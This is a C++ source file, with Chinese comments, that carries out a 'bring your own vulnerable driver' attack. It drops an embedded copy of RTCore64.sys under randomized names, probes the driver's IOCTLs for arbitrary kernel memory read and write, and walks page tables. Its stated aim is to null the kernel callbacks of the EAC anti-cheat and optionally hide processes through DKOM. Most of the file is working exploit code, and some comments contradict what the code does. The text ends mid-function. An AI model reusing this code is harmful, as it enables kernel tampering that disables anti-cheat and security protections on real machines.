// ============================================================
// byovd_kernel.cpp — BYOVD 内核级 EAC 防御完整实现
//
// 技术栈:
//   1. RTCore64.sys BYOVD 加载 (合法签名漏洞驱动)
//   2. CR3 页表遍历: VA→PA 转换 (PML4→PDPT→PD→PT)
//   3. 物理内存 R/W: IOCTL 0x80002048/0x4C 读写任意物理地址 (CVE-2022-22077, FMT_48B_PA_AT_00)
//   4. Sigscan ObRegisterCallbacks → 定位 ObpCallbackArrayHead
//   5. 遍历回调数组 → NULL EAC 的所有注册回调
//   6. DKOM EPROCESS 断链 (可选, 触发 PatchGuard)
//
// 参考: Lazarus FudModule, kdmapper, EDRSandBlast, CheekyBlinder
// ============================================================

#include "byovd_kernel.h"
#include <winreg.h>
#include <winternl.h>
#include <winsvc.h>
#include <cstdio>
#include <cstring>
#include <algorithm>
#include <fstream>
#include <random>
#include <ctime>
#include <cstdarg>
#include <Psapi.h>
#ifdef _MSC_VER
#include <intrin.h>
#endif

// ★ v3.37: BYOVD 本地诊断日志 (写 %TEMP%\stealth_diag.log)
static void ByovdDiag(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len < 0) return;
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"stealth_diag.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);  // ★ v3.38: 强制落盘
        CloseHandle(h);
    }
}

// BYOVD 驱动嵌入支持: 将 RTCore64.sys 编译进 payload
//   python scripts/embed_driver.py RTCore64.sys → rtcore64_embed.h
//   v3.47: 始终嵌入, 移除 #ifdef 编译开关 — 驱动从 TEMP 提取
#include "rtcore64_embed.h"

#pragma comment(lib, "advapi32.lib")

// ★ v3.78: 全局引用 payload.cpp 中的 VEH 自愈备份缓冲区
//   由 MapPhysical 的主动恢复使用
extern uint8_t* g_backupBuf;
extern SIZE_T   g_backupLen;
extern uint8_t* g_backupCodeBase;
extern void*    g_vehHandlerPageVA;

namespace stealth {

// ============================================================
// v3.69: 受保护用户态区域全局变量
// 注意: 单线程访问, 无需同步
// ============================================================
std::vector<ProtectedUserRegion> g_protectedUserRegions;

// ============================================================
// PML4 物理地址获取 — 通过 IOCTL 扫描物理内存
//
// ★ v3.84: mov cr3 是特权指令, 在用户态(Ring 3)执行会触发
//   STATUS_PRIVILEGED_INSTRUCTION (0xC0000096) → #GP(0)。
//   改为通过 RTCore64 IOCTL 直接映射物理内存,
//   扫描寻找当前进程的 PML4 表并缓存其物理地址。
//
//   原理: PML4 表是一个 4KB 页, 包含 512 个 uint64 表项。
//   内核半区 (entry 256-511) 在所有进程中共享相同的物理 PDPT 指向,
//   因此可通过验证内核 PML4E → PDPTE 链来确定 PML4 身份。
// ============================================================

// ★ ReadCR3 不能是 static — 需要在 byovd_kernel.h 中 friend 声明

// ★ v3.99: IOCTL 探测 — 逆向分析 RTCore64.sys 发现:
//   - IOCTL 基码: 0x80002000 (CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, ANY))
//   - 驱动 dispatch 检查: (ioctl + 0x7FFFE000) <= 0x54 → 有效范围 0x80002000~0x80002054
//   - 子码步长: 4 (0x00, 0x04, 0x08, ... 0x54)
//   - 已知子码功能:
//       0x00: 虚拟内存读/写 (48字节输入)
//       0x08: I/O 端口读字节
//       0x0C: I/O 端口读字
//       0x10: I/O 端口读双字
//       0x14: I/O 端口写字节
//       0x18: PCI 配置空间访问 (24字节输入)
//       0x1C: I/O 端口写双字
//       0x20: 简单操作/获取版本 (8字节输入)
//       0x28: RDMSR (12字节输入)
//       0x2C: WRMSR (12字节输入)
//       0x30: 物理内存映射 (MmMapIoSpace, 48字节输入)
//       0x34: 物理内存映射变体 (48字节输入)
//       0x40-0x54: 复用 0x30-0x34 的 handler
// ★ v3.103: 安全 IOCTL 探测 — 0x80002048/0x8000204C 为物理内存 R/W 主候选
//   参考: CVE-2022-22077, deepwiki RTCore64 Analysis
//   BSOD教训: 0x80002040(PCI Bus) 导致 err=1450 (资源耗尽) → 蓝屏
//   v3.102 错误: 0xC3502580 是 MSR 操作, 不是物理内存映射
//   v3.101 错误: 0x80002030/0x34 返回 err=87 (参数不匹配)
//   修复: 0x80002048(Read PhysMem) + 0x8000204C(Write PhysMem) 是正确 IOCTL
//   输入结构: { uint64_t physAddr; uint32_t size; uint32_t reserved; } (12-16字节)
//   测试物理地址: 0x100000 (1MB), 避开 BIOS 数据区
static const uint32_t g_ioctlCandidates[] = {
    0x80002048,  // ★ 主候选: 物理内存读取 (MmMapIoSpace)
    0x8000204C,  // ★ 主候选: 物理内存写入 (MmMapIoSpace)
    0x80002030,  // 备选: 物理内存映射变体
    0x80002034,  // 备选: 物理内存映射变体
};
static const int g_ioctlCandidateCount = sizeof(g_ioctlCandidates) / sizeof(g_ioctlCandidates[0]);

// ★ v3.101: 安全测试物理地址 — 1MB 处, 避开 BIOS 数据区 (0-1MB)
static const uint64_t SAFE_TEST_PHYS = 0x100000;

// ★ v3.99: 请求格式枚举 — 适配 0x80002000 系列 IOCTL
//   逆向分析: 驱动使用 METHOD_BUFFERED, SystemBuffer 传递参数
//   不同 sub-code 对应不同输入结构大小:
//     0x00: 48字节 (虚拟内存 R/W)
//     0x08-0x1C: 8字节 (I/O 端口)
//     0x18: 24字节 (PCI 配置空间)
//     0x20: 8字节 (简单操作)
//     0x28/0x2C: 12字节 (RDMSR/WRMSR)
//     0x30/0x34: 48字节 (物理内存映射)
enum class RTCore64Format {
    FMT_48B_PA_AT_00 = 0,  // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
    FMT_48B_PA_AT_08,       // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
    FMT_32B_RAW,            // 32字节: { uint64_t pa; uint32_t sz; uint32_t fl; } (旧格式兼容)
    FMT_8B_RAW,             // 8字节: 仅 uint64_t (I/O port 等)
    FMT_12B_RAW,            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; } (MSR)
};

// ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;

// ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
static uint32_t g_probedReadIoctl  = 0;
static uint32_t g_probedWriteIoctl = 0;

// ★ v3.109: 内核虚拟地址读取 — 通过 IOCTL 0x80002048 读取内核虚拟内存
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
//   参考: https://github.com/grisuno/CVE-2022-22077
static bool KernelVAReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                  uint64_t kernelVA, void* outBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    uint8_t outBufLocal[128] = {};
    size_t bytesRead = 0;

    for (size_t off = 0; off < size; ) {
        // 每次读取最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次读取
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        // sizeType: 1=BYTE, 2=WORD, 4=DWORD (exploit 使用 2=WORD, 4=DWORD)
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 构造 IOCTL 输入 (48字节)
        uint8_t inBuf[48] = {};
        // offset +0x00: pad0 (unused, set to 0)
        // offset +0x08: kernel virtual address
        *(uint64_t*)(inBuf + 0x08) = kernelVA + off;
        // offset +0x18: sizeType (1=BYTE, 2=WORD, 4=DWORD)
        *(uint32_t*)(inBuf + 0x18) = sizeType;
        // offset +0x1C: value (output)

        uint8_t outBufTmp[48] = {};
        memcpy(outBufTmp, inBuf, sizeof(inBuf));
        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  outBufTmp, sizeof(outBufTmp),
                                  outBufTmp, sizeof(outBufTmp),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:KVARead: ioctl=0x%08X va=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(kernelVA + off), GetLastError());
            return false;
        }

        // 读取结果在 offset +0x1C (value 字段, 总是 DWORD)
        uint32_t readVal = *(uint32_t*)(outBufTmp + 0x1C);
        uint32_t validBytes = (sizeType == 1) ? 1 : (sizeType == 2) ? 2 : 4;
        memcpy((uint8_t*)outBuf + off, &readVal, (validBytes < chunk) ? validBytes : (uint32_t)chunk);
        off += chunk;
        bytesRead += chunk;
    }
    return bytesRead > 0;
}

// ★ v3.109: 内核虚拟地址写入 — 通过 IOCTL 0x8000204C 写入内核虚拟内存
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次写入; 64位值通过两次 DWORD 写入完成
static bool KernelVAWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                   uint64_t kernelVA, const void* inBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    for (size_t off = 0; off < size; ) {
        // 每次写入最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次写入
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        // sizeType: 1=BYTE, 2=WORD, 4=DWORD
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 读取要写入的值 (最多 4 bytes)
        uint32_t writeVal = 0;
        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);

        // 构造 IOCTL 输入 (48字节)
        uint8_t outBuf[48] = {};
        // offset +0x00: pad0 (unused)
        // offset +0x08: kernel virtual address
        *(uint64_t*)(outBuf + 0x08) = kernelVA + off;
        // offset +0x18: sizeType
        *(uint32_t*)(outBuf + 0x18) = sizeType;
        // offset +0x1C: value to write
        *(uint32_t*)(outBuf + 0x1C) = writeVal;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  outBuf, sizeof(outBuf),
                                  outBuf, sizeof(outBuf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:KVAWrite: ioctl=0x%08X va=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(kernelVA + off), GetLastError());
            // 继续尝试, 不中断整个操作
        }
        off += chunk;
    }
    return true;
}

// 尝试一种 IOCTL 码 + 格式组合 (用于探测)
// ★ v3.104: 改为检测数据返回而非 VA 映射 — 验证返回数据是否合理
static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
                           RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr) {
    uint8_t inBuf[64] = {};
    DWORD inSize = 0;
    // ★ v3.99: output buffer 增大到 512 字节, 某些格式需要更大的输出空间
    union { uint8_t raw[512]; uint8_t* mappedPtr; } outBuf;
    outBuf.mappedPtr = nullptr;
    DWORD bytesRet = 0;

    switch (fmt) {
        case RTCore64Format::FMT_48B_PA_AT_00: {
            // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
            // 驱动内部: ZwOpenSection(\Device\PhysicalMemory) + ZwMapViewOfSection
            struct { uint64_t pa; uint64_t mappedVA; uint8_t pad[32]; } req;
            memset(&req, 0, sizeof(req));
            req.pa = physAddr;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_48B_PA_AT_08: {
            // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
            // 驱动内部: MmMapIoSpace(physAddr, ...)
            struct { uint64_t unk0; uint64_t pa; uint32_t sz; uint8_t pad[28]; } req;
            memset(&req, 0, sizeof(req));
            req.unk0 = 0;
            req.pa = physAddr;
            req.sz = 0x1000;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_32B_RAW: {
            // 旧格式: { uint64_t pa; uint32_t sz; uint32_t fl; }
            struct { uint64_t pa; uint32_t sz; uint32_t fl; } req;
            req.pa = physAddr;
            req.sz = 0x1000;
            req.fl = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_8B_RAW: {
            // 8字节: 仅 uint64_t
            memcpy(inBuf, &physAddr, sizeof(physAddr));
            inSize = sizeof(physAddr);
            break;
        }
        case RTCore64Format::FMT_12B_RAW: {
            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; }
            struct { uint32_t idx; uint32_t hi; uint32_t lo; } req;
            req.idx = (uint32_t)physAddr;
            req.hi = 0;
            req.lo = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
    }

    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                              inBuf, inSize,
                              outBuf.raw, sizeof(outBuf.raw),
                              &bytesRet, nullptr);
    DWORD err = GetLastError();
    if (outErr) *outErr = err;

    // ★ v3.99: 对于 0x80002030/0x34, 映射结果在 SystemBuffer[0x08] 处
    //   DeviceIoControl 会将 SystemBuffer 复制回 output buffer
    //   mappedVA 就在 outBuf 的前 8 字节 (或偏移 8 字节处)
    if (ok) {
        // 尝试从 output buffer 的不同偏移读取映射地址
        uint64_t candidateVA = 0;
        memcpy(&candidateVA, outBuf.raw, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_00: mappedVA 在 output[0x00]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        memcpy(&candidateVA, outBuf.raw + 8, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_08: mappedVA 在 output[0x08]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        // 如果 ok 但 mappedVA 为空, 可能驱动返回了成功但用了不同的输出格式
        // 尝试直接使用 output buffer 指针
        if (outBuf.mappedPtr) {
            *outVirtAddr = outBuf.mappedPtr;
            return true;
        }
    }
    return false;
}

// ★ v3.109: 安全 IOCTL 探测 — 使用正确的内核VA读取格式
//   参考: CVE-2022-22077, https://github.com/grisuno/CVE-2022-22077
//   IOCTL 0x80002048: 读取内核虚拟地址 (48字节输入)
//   结构: pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考 exploit.c)
//   - 每次探测间 Sleep(50ms) 防止资源耗尽
static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
    int totalProbes = 0;
    const int MAX_PROBES = 8;

    for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
        uint32_t ioctl = g_ioctlCandidates[ci];
        if (ioctl == 0x80002040 || ioctl == 0x80002044 || ioctl == 0x80002050 || ioctl == 0x80002054) {
            // 跳过危险 IOCTL 码
            continue;
        }

        totalProbes++;

        // 使用正确的内核VA读取格式
        // 尝试读取一个已知的内核地址: ntoskrnl.exe 通常在 0xFFFFF80000000000 附近
        // 但我们不知道确切地址, 先尝试读取 0xFFFFF80000000000
        uint64_t testKVA = 0xFFFFF80000000000ULL;

        // 构造 IOCTL 输入 (48字节)
        uint8_t inBuf[48] = {};
        // offset +0x08: kernel virtual address
        *(uint64_t*)(inBuf + 0x08) = testKVA;
        // offset +0x18: sizeType = 4 (DWORD, 参考 exploit.c)
        *(uint32_t*)(inBuf + 0x18) = 4;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctl,
                                  inBuf, sizeof(inBuf),
                                  inBuf, sizeof(inBuf),
                                  &bytesRet, nullptr);
        DWORD err = GetLastError();
        uint32_t readVal = *(uint32_t*)(inBuf + 0x1C);

        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u va=0x%llX val=0x%08X probe=%d/%d\n",
                  ioctl, (int)ok, err, (unsigned long long)testKVA, readVal, totalProbes, MAX_PROBES);

        if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
            // IOCTL 成功, 读取到有效数据
            g_probedReadIoctl = ioctl;
            // 写 IOCTL 通常是读 IOCTL + 4
            g_probedWriteIoctl = ioctl + 4;
            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X (val=0x%08X)\n",
                      g_probedReadIoctl, g_probedWriteIoctl, readVal);
            return ioctl;
        }

        // 再试一个不同的内核地址范围
        testKVA = 0xFFFFF80400000000ULL;
        memset(inBuf, 0, sizeof(inBuf));
        *(uint64_t*)(inBuf + 0x08) = testKVA;
        *(uint32_t*)(inBuf + 0x18) = 4;
        totalProbes++;

        ok = DeviceIoControl(hDevice, ioctl,
                             inBuf, sizeof(inBuf),
                             inBuf, sizeof(inBuf),
                             &bytesRet, nullptr);
        err = GetLastError();
        readVal = *(uint32_t*)(inBuf + 0x1C);

        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u va=0x%llX val=0x%08X probe=%d/%d\n",
                  ioctl, (int)ok, err, (unsigned long long)testKVA, readVal, totalProbes, MAX_PROBES);

        if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
            g_probedReadIoctl = ioctl;
            g_probedWriteIoctl = ioctl + 4;
            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X (val=0x%08X)\n",
                      g_probedReadIoctl, g_probedWriteIoctl, readVal);
            return ioctl;
        }

        Sleep(50);
    }
    return 0; // 全部失败
}

// 轻量物理读取: 直接 IOCTL, 无日志/缓存/overlap 检查
// ★ v3.108: 改为使用 KernelVAReadViaIOCTL 直接读取内核VA
static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
                           uint64_t physAddr, uint8_t* outBuf4K) {
    if (!outBuf4K) return false;
    // 注意: 此函数读取物理地址, 但 IOCTL 读取内核VA
    // 尝试用 KernelVAReadViaIOCTL 直接通过物理地址读取
    return KernelVAReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
}

// 检查一个物理页是否为当前进程的 PML4 表
static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
                        uint64_t physAddr, uint64_t* pml4Entries) {
    // ★ v3.104: 直接读取物理页到 pml4Entries 缓冲区
    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, (uint8_t*)pml4Entries))
        return false;

    uint64_t* entries = pml4Entries;

    // 验证: 内核半区 (entry 256-511) 需要大部分 Present
    int kernelPresent = 0;
    for (int i = 256; i < 512; i++) {
        if (entries[i] & 1) kernelPresent++;
    }
    if (kernelPresent < 200) return false; // 至少 200 个内核条目

    // 验证: 抽查一个内核 PDPT — entry 0x1F0~0x1FF 是高内核地址区域
    for (int i = 490; i < 512; i++) {
        if (!(entries[i] & 1)) continue;
        uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;

        uint8_t pdptBuf[0x1000];
        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, pdptBuf))
            continue;

        // 读取 PDPT, 检查其内核半区是否也有 Present 条目
        uint64_t* pdptEntries = (uint64_t*)pdptBuf;

        int pdptKernel = 0;
        for (int j = 256; j < 512; j++) {
            if (pdptEntries[j] & 1) pdptKernel++;
        }
        if (pdptKernel > 100) return true; // 有效 PDPT → 确认为 PML4
    }
    return false;
}

// 通过 IOCTL 扫描物理内存寻找 PML4 表物理地址
static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
    // ★ v3.85: 先验证 IOCTL 是否真的可用 (避免在僵尸驱动上白扫描)
    {
        uint8_t testBuf[0x1000];
        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, testBuf);
        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d\n",
                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk);
        if (!testOk) {
            ByovdDiag("BYOVD:FindPML4: IOCTL FAILED — driver zombie?\n");
            return 0; // IOCTL 不可用, 无需扫描
        }
    }

    // PML4 通常在低物理地址 (非分页池)
    // ★ v3.101: 从 1MB 开始扫描, 避开 0-1MB 的 BIOS 危险区域
    uint64_t pml4Entries[512]; // 栈上缓冲区
    const uint64_t SCAN_START  = SAFE_TEST_PHYS; // 1MB
    const uint64_t SCAN_LIMIT  = 0x8000000;       // 128 MB

    for (uint64_t phys = SCAN_START; phys < SCAN_LIMIT; phys += 0x1000) {
        // 每 4MB (1024 页) 输出进度
        if ((phys & 0x3FFFFF) == 0) {
            ByovdDiag("BYOVD:FindPML4: scanning @ phys=0x%llX / 0x%llX...\n",
                      (unsigned long long)phys, (unsigned long long)SCAN_LIMIT);
        }

        if (IsValidPML4(hDevice, ioctlCode, phys, pml4Entries)) {
            ByovdDiag("BYOVD:FindPML4: FOUND at phys=0x%llX (scanned %llu pages)\n",
                      (unsigned long long)phys, (unsigned long long)(phys >> 12));
            return phys;
        }
    }

    ByovdDiag("BYOVD:FindPML4: NOT FOUND in 128MB scan range\n");
    return 0;
}

// 获取 PML4 物理地址 (懒初始化 + 缓存)
// ★ 不能是 static: byovd_kernel.h 需要 friend 声明
uint64_t ReadCR3() {
    static uint64_t s_cachedPML4 = 0;
    if (s_cachedPML4) return s_cachedPML4;

    auto& kma = KernelMemoryAccessor::Instance();
    // 注意: 此时 m_active=true, m_hDevice 有效 (Initialize 中调用)

    // ★ v3.84: 通过 IOCTL 扫描物理内存获取 PML4, 避免特权指令 crash
    //   ReadPhysical(0x1000, ...) 会走 MapPhysical → IOCTL → 映射成功即可读
    //   但更直接的方式: 用 raw IOCTL 扫描
    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, kma.m_driverInfo.ioctlCode);

    ByovdDiag("BYOVD:ReadCR3: PML4 phys=0x%llX\n",
              (unsigned long long)s_cachedPML4);
    return s_cachedPML4;
}

// ============================================================
// 页表遍历: 虚拟地址 → 物理地址
//
// x64 分页结构:
//   [47:39] PML4 索引 (9 bits)    → PML4E
//   [38:30] PDPT 索引 (9 bits)    → PDPTE
//   [29:21] PD   索引 (9 bits)    → PDE
//   [20:12] PT   索引 (9 bits)    → PTE  (4KB 页; 2MB 大页跳过此层)
//   [11:0]  页内偏移  (12 bits)   → 最终地址
//
// 使用 __readcr3() 获取当前进程 CR3, 
// 内核空间页表跨所有进程共享, 因此可翻译任意内核地址
// ============================================================
class PageTableWalker {
public:
    PageTableWalker(uint64_t cr3, KernelMemoryAccessor& kma)
        : m_cr3(cr3 & ~0xFFF), m_kma(kma) {}

    // 将内核虚拟地址转换为物理地址
    // 返回 0 表示页不存在或转换失败
    uint64_t VaToPa(uint64_t va) {
        uint64_t pml4_idx = (va >> 39) & 0x1FF;
        uint64_t pdpt_idx = (va >> 30) & 0x1FF;
        uint64_t pd_idx   = (va >> 21) & 0x1FF;
        uint64_t pt_idx   = (va >> 12) & 0x1FF;
        uint64_t offset   = va & 0xFFF;

        // Level 1: PML4
        uint64_t pml4e = ReadPhysQword(m_cr3 + pml4_idx * 8);
        if (!(pml4e & 1)) return 0;                    // Present
        uint64_t pdpt_pa = PFN_TO_PA(pml4e);

        // Level 2: PDPT
        uint64_t pdpte = ReadPhysQword(pdpt_pa + pdpt_idx * 8);
        if (!(pdpte & 1)) return 0;
        uint64_t pd_pa = PFN_TO_PA(pdpte);

        // Level 3: Page Directory
        uint64_t pde = ReadPhysQword(pd_pa + pd_idx * 8);
        if (!(pde & 1)) return 0;

        // 检查 2MB 大页 (PS bit = bit 7)
        if (pde & (1ULL << 7)) {
            return PFN_TO_PA_LARGE(pde) + (va & ((1ULL << 21) - 1));
        }

        // Level 4: Page Table
        uint64_t pte = ReadPhysQword(PFN_TO_PA(pde) + pt_idx * 8);
        if (!(pte & 1)) return 0;

        return PFN_TO_PA(pte) + offset;
    }

private:
    // PFN → 物理地址 (清除低12位标志 + NX位)
    static uint64_t PFN_TO_PA(uint64_t entry) {
        return (entry & 0x0000FFFFFFFFF000ULL) & ~(1ULL << 63);  // 清除 NX
    }

    static uint64_t PFN_TO_PA_LARGE(uint64_t entry) {
        return (entry & 0x0000FFFFFFE00000ULL) & ~(1ULL << 63);
    }

    // 通过 RTCore64 物理内存映射读取 8 字节
    uint64_t ReadPhysQword(uint64_t physicalAddr) {
        uint64_t value = 0;
        m_kma.ReadPhysical(physicalAddr, &value, sizeof(value));
        return value;
    }

    uint64_t m_cr3;
    KernelMemoryAccessor& m_kma;
};

// ============================================================
// BYOVD 驱动定义
// ============================================================

const BYOVDDriverInfo BYOVDDrivers::RTCore64 = {
    L"RTCore64Svc",
    L"RTCore64 Micro-Star Driver",
    L"\\\\.\\RTCore64",
    L"RTCore64.sys",
    0x80002048,   // ★ v3.105: 物理内存读取 IOCTL (CVE-2022-22077)
    true
};

// v3.57: 仅 RTCore64 — 其他驱动无嵌入文件, 从候选列表移除
static const BYOVDDriverInfo* g_driverCandidates[] = {
    &BYOVDDrivers::RTCore64,
};

const BYOVDDriverInfo* BYOVDDrivers::GetAllCandidates() {
    return g_driverCandidates[0];
}

int BYOVDDrivers::GetCandidateCount() {
    return sizeof(g_driverCandidates) / sizeof(g_driverCandidates[0]);
}

// ============================================================
// KernelMemoryAccessor 实现
// ============================================================

KernelMemoryAccessor& KernelMemoryAccessor::Instance() {
    static KernelMemoryAccessor inst;
    return inst;
}

bool KernelMemoryAccessor::IsHVCIEnabled() {
    // 方法1: 注册表检测
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD hvci = 0, size = sizeof(DWORD);
        RegQueryValueExW(hKey, L"HypervisorEnforcedCodeIntegrity",
            nullptr, nullptr, (LPBYTE)&hvci, &size);
        RegCloseKey(hKey);
        if (hvci != 0) return true;
    }

    // 方法2: SystemCodeIntegrityInformation (0x67) 
    // 通过 NtQuerySystemInformation
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        using NtQuerySystemInfo_t = LONG(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
        auto pNtQsi = (NtQuerySystemInfo_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (pNtQsi) {
            struct { ULONG length; ULONG flags; } ci = {};
            ULONG retLen = 0;
            pNtQsi(0x67, &ci, sizeof(ci), &retLen);
            if (ci.flags & 0x01) return true; // CODEINTEGRITY_OPTION_ENABLED
        }
    }

    return false;
}

// ============================================================
// 确保 BYOVD 驱动文件存在 (嵌入式提取回退)
//
// 优先级:
//   0. 给定路径直接存在 (MutateAndRandomizeDriver 已写入 %TEMP%)
//   1. System32\drivers\<name> (系统已安装)
//   2. %TEMP%\<name> (从嵌入字节提取)
// ============================================================
static std::wstring EnsureDriverFile(const std::wstring& driverName) {
    // ★ v3.97: 0. 先检查给定路径是否直接存在 (MutateAndRandomizeDriver 已写入 TEMP)
    if (GetFileAttributesW(driverName.c_str()) != INVALID_FILE_ATTRIBUTES) {
        ByovdDiag("BYOVD:EnsureDriverFile: file exists at given path '%ls'\n", driverName.c_str());
        return driverName;
    }

    wchar_t sysPath[MAX_PATH];

    // 1. 检查 System32\drivers
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\drivers\\");
    wcscat_s(sysPath, driverName.c_str());

    if (GetFileAttributesW(sysPath) != INVALID_FILE_ATTRIBUTES) {
        return std::wstring(sysPath); // 系统已安装
    }

    // 2. 从嵌入字节提取到 %TEMP%
    {
        const uint8_t* embedData = nullptr;
        size_t embedSize = 0;

        // 匹配驱动文件名 (支持纯文件名和完整路径)
        const wchar_t* baseName = driverName.c_str();
        const wchar_t* lastSlash = wcsrchr(baseName, L'\\');
        if (lastSlash) baseName = lastSlash + 1;

        if (wcscmp(baseName, L"RTCore64.sys") == 0) {
            embedData = stealth::embedded::RTCore64_data;
            embedSize = stealth::embedded::RTCore64_size;
            ByovdDiag("BYOVD:EnsureDriverFile: matched RTCore64, embed=0x%p size=%zu\n", embedData, embedSize);
        } else {
            ByovdDiag("BYOVD:EnsureDriverFile: driverName '%ls' != RTCore64.sys\n", driverName.c_str());
        }

        if (embedData && embedSize > 0) {
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            wcscat_s(tempPath, driverName.c_str());

            for (int retry = 0; retry < 5; retry++) {
                wchar_t tryPath[MAX_PATH];
                GetTempPathW(MAX_PATH, tryPath);
                if (retry == 0) {
                    wcscat_s(tryPath, driverName.c_str());
                } else {
                    wchar_t altName[64];
                    swprintf_s(altName, L"RTCore64_%04X.sys", rand() & 0xFFFF);
                    wcscat_s(tryPath, altName);
                }

                DeleteFileW(tryPath);
                HANDLE hFile = CreateFileW(tryPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
                                           nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, embedData, (DWORD)embedSize, &written, nullptr);
                    FlushFileBuffers(hFile);
                    CloseHandle(hFile);
                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, embedSize, tryPath, retry);
